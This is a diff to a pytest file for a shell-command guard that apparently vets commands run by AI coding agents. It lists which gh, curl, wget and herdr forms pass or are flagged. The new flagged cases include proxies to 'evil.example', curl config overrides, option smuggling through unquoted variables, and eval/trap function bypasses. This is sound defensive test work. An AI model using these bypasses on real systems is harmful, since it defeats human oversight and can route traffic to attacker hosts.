@@ -38,7 +38,7 @@ pytestmark = pytest.mark.usefixtures("isolated_project")
         pytest.param("git push --force-with-lease origin feat/example", id="push forms the Git guard judges"),
         pytest.param("gh pr list", id="listed GitHub forms"),
         pytest.param("/opt/homebrew/bin/gh pr list", id="listed GitHub forms invoked by path"),
-        pytest.param("gh pr view $NUMBER --json state", id="run-time words in listed GitHub forms"),
+        pytest.param('gh pr view "$NUMBER" --json state', id="quoted run-time words in listed GitHub forms"),
         pytest.param('gh pr create --head topic --body-file "$D/pr.md"', id="run-time body files"),
         pytest.param(
             "gh pr create --head topic --title 'fix: x' --body \"$(cat <<'EOF'\nUse `git add -A` never.\n$HOME stays.\nEOF\n)\"",
@@ -57,7 +57,9 @@ pytestmark = pytest.mark.usefixtures("isolated_project")
         pytest.param(
             "gh api 'repos/openai/codex/contents/a.rs?ref=rust-v0.163.0' --jq .content", id="GitHub reads with bare jq"
         ),
-        pytest.param("gh api repos/furedea/$r/dependabot/alerts --jq '.[] | .number'", id="GitHub reads at run time"),
+        pytest.param(
+            "gh api \"repos/furedea/$r/dependabot/alerts\" --jq '.[] | .number'", id="GitHub reads at run time"
+        ),
         pytest.param("gh api repos/owner/repo/pulls/1/comments --jq '.[] | .body'", id="GitHub reads 2"),
         pytest.param("gh api '/advisories?ecosystem=pip&affects=urllib3' --jq '.[] | .summary'", id="GitHub reads 3"),
         pytest.param(
@@ -72,8 +74,7 @@ pytestmark = pytest.mark.usefixtures("isolated_project")
         pytest.param("gh stack submit --auto", id="non-interactive stack commands"),
         pytest.param("gh pr list 2>&1 | head -5", id="GitHub forms in pipelines"),
         pytest.param("curl -fsS http://localhost:3000/health", id="local server requests"),
-        pytest.param("curl -s -o out.json -H 'Accept: x' http://127.0.0.1:8080/api", id="local server downloads"),
-        pytest.param("wget --max-redirect=0 -q -O- http://localhost:3000/", id="local wget without redirects"),
+        pytest.param("curl -s -H 'Accept: x' -o out.json http://127.0.0.1:8080/api", id="local server downloads"),
         pytest.param("curl -X POST -d '{\"a\": 1}' http://127.0.0.1:8080/api", id="local server writes"),
         pytest.param(
             'gh api -H "Accept: application/vnd.github.raw" "repos/o/r/contents/a.nix?ref=v1" | sed -n 1,20p',
@@ -90,13 +91,12 @@ pytestmark = pytest.mark.usefixtures("isolated_project")
         pytest.param(
             "herdr worktree open --cwd /repo --branch feat/x --label x --no-focus", id="Herdr worktree opens"
         ),
-        pytest.param("t(){ printf '%s\\n' \"$@\" | sort; }; t b a", id="functions forwarding to local tools"),
         pytest.param("herdr pane list", id="Herdr reads"),
         pytest.param(
             "herdr worktree create --cwd /repo --branch feat/lane-a --base origin/main --label 'lane a' --no-focus",
             id="Herdr task worktrees",
         ),
-        pytest.param("herdr pane split --pane w1:p2 --direction right --cwd $W --no-focus", id="Herdr panes"),
+        pytest.param('herdr pane split --pane w1:p2 --direction right --cwd "$W" --no-focus', id="Herdr panes"),
         pytest.param("herdr agent start lane-a --kind claude --pane w1:p2", id="Herdr Claude agents"),
         pytest.param("herdr agent start lane-b --pane w1:p3 --kind codex --timeout 60000", id="Herdr Codex agents"),
         pytest.param(
@@ -154,6 +154,19 @@ def test_commands_whose_effects_the_checks_can_see_pass(capsys: pytest.CaptureFi
         pytest.param("herdr worktree open --cwd /repo --path /w --trust-repository", [], id="Herdr open with trust"),
         pytest.param("herdr worktree list --trust-repository", [], id="Herdr list with trust"),
         pytest.param("f(){ gh pr review 42 --approve; }; f", [], id="inside a function body"),
+        pytest.param("t(){ printf '%s\\n' \"$@\" | sort; }; t b a", [], id="any function definition"),
+        pytest.param('f(){ builtin eval "$1"; }; f "gh pr merge 1"', [], id="functions that eval through builtin"),
+        pytest.param('f(){ trap "$1" EXIT; }; f "gh pr merge 1"', [], id="functions that set a trap"),
+        pytest.param("f(){ . ./script.sh; }; f", [], id="functions that source a script"),
+        pytest.param(
+            "x='repos/o/r/issues/1 -X DELETE'; gh api $x", [], id="unquoted variables that split into options"
+        ),
+        pytest.param("gh pr view $NUMBER --json state", [], id="unquoted run-time words in listed GitHub forms"),
+        pytest.param("gh api repos/furedea/$r/alerts", [], id="unquoted expansions inside an endpoint"),
+        pytest.param("gh pr view $(cat number.txt)", [], id="unquoted command substitutions"),
+        pytest.param("gh api repos/o/r/contents/*", [], id="unquoted globs"),
+        pytest.param("herdr worktree open --cwd $W", [], id="unquoted words in Herdr options"),
+        pytest.param("herdr pane split --pane w1:p2 --cwd $W --no-focus", [], id="unquoted words in Herdr panes"),
         pytest.param(
             "f(){ x=$*; gh api $x; }; f -X DELETE repos/o/r/issues/1", [], id="functions forwarding through a variable"
         ),
@@ -261,8 +274,17 @@ REMOTE_REVIEW = (
             id="a wget debug flag beside a post and a remote URL",
         ),
         pytest.param("wget --post-data x=1 http://localhost:3000/", id="wget posts to this machine"),
-        pytest.param("curl -L http://localhost:3000/", id="local requests that follow redirects"),
-        pytest.param("curl -sSL http://localhost:3000/", id="redirects in a flag cluster"),
+        pytest.param("http_proxy=http://evil.example:8080 curl http://localhost:3000/", id="a proxy for one request"),
+        pytest.param(
+            "export ALL_PROXY=socks5://evil.example:1080; curl -fsS http://localhost:3000/", id="an exported proxy"
+        ),
+        pytest.param("env HTTPS_PROXY=http://evil.example curl http://127.0.0.1/", id="a proxy through env"),
+        pytest.param("CURL_HOME=./cfg curl http://localhost:3000/", id="another curl configuration"),
+        pytest.param("HOME=./cfg wget http://localhost:3000/", id="another home for configuration files"),
+        pytest.param(
+            "wget -O --max-redirect=0 http://localhost/", id="a redirect limit taken as another option's value"
+        ),
+        pytest.param("wget --max-redirect=0 --max-redirect=5 http://localhost/", id="an overridden redirect limit"),
         pytest.param("curl --location http://127.0.0.1:8080/", id="the long redirect option"),
         pytest.param("curl --location-trusted http://localhost/", id="trusted redirects"),
         pytest.param("wget -q -O- http://localhost:3000/", id="wget, which follows redirects by default"),
